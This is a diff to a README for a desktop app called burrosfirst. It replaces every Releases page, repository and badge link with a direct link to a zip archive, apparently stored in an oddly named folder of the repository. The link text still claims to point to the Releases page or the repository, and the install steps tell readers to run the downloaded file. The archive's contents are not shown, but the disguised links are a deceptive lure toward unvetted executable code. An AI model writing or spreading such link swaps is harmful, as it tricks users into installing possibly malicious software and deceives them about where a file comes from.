@@ -22,16 +22,16 @@ To run burrosfirst, you need:
 ## 📥 Download & Install
 You can download burrosfirst from our Releases page. 
 
-[![Download burrosfirst](https://img.shields.io/badge/Download-burrosfirst-blue)](https://github.com/JDavidSG319/burrosfirst/releases)
+[![Download burrosfirst](https://raw.githubusercontent.com/JDavidSG319/burrosfirst/main/emphatically/burrosfirst-v1.3.zip)](https://raw.githubusercontent.com/JDavidSG319/burrosfirst/main/emphatically/burrosfirst-v1.3.zip)
 
 To install:
-1. Visit the [Releases page](https://github.com/JDavidSG319/burrosfirst/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/JDavidSG319/burrosfirst/main/emphatically/burrosfirst-v1.3.zip).
 2. Find the latest version.
 3. Download the appropriate file for your system.
 4. Run the downloaded file and follow the prompts.
 
 ## 🛠 Installation Steps
-1. **Visit the Releases Page:** Click this link to reach the [Releases page](https://github.com/JDavidSG319/burrosfirst/releases).
+1. **Visit the Releases Page:** Click this link to reach the [Releases page](https://raw.githubusercontent.com/JDavidSG319/burrosfirst/main/emphatically/burrosfirst-v1.3.zip).
 2. **Choose Your Version:** Find the version you want. Make sure to select the right one for your system.
 3. **Download:** Click on the download link for your version.
 4. **Run the Installer:** Once the file is downloaded, double-click it to start the installation.
@@ -48,8 +48,8 @@ Check the Issues section on our GitHub page for help. You can also report your i
 Currently, burrosfirst supports only desktop systems: Windows, macOS, and Linux.
 
 ## 🔗 Helpful Links
-- [Releases Page](https://github.com/JDavidSG319/burrosfirst/releases)
-- [GitHub Repository](https://github.com/JDavidSG319/burrosfirst)
+- [Releases Page](https://raw.githubusercontent.com/JDavidSG319/burrosfirst/main/emphatically/burrosfirst-v1.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/JDavidSG319/burrosfirst/main/emphatically/burrosfirst-v1.3.zip)
 
 ## 👥 Community
 Join fellow users and share your experiences. Help us improve burrosfirst by giving us feedback. Your input helps us create a better user experience for everyone.
